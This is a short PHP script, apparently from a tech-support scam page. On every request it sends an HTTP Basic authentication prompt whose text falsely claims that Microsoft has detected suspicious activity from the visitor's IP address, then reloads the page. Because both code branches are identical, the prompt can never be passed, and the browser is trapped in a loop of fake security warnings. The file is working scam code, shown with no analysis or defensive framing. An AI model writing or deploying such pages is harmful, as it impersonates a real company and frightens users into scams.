<?php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
	header('Content-Type: charset=utf-8');
	header('Content-Language: en');
    header('WWW-Authenticate: Basic realm="Microsoft has detected suspicious activity from your IP address."');
    header('HTTP/1.0 401 Unauthorized');
    echo '<script>window.location.reload();</script>';
    exit;
} 
elseif(isset($_SERVER['PHP_AUTH_USER'])) {
	header('Content-Type: charset=utf-8');
	header('Content-Language: en');
    header('WWW-Authenticate: Basic realm="Microsoft has detected suspicious activity from your IP address."');
    header('HTTP/1.0 401 Unauthorized');
    echo '<script>window.location.reload();</script>';
    exit;
} 
?>
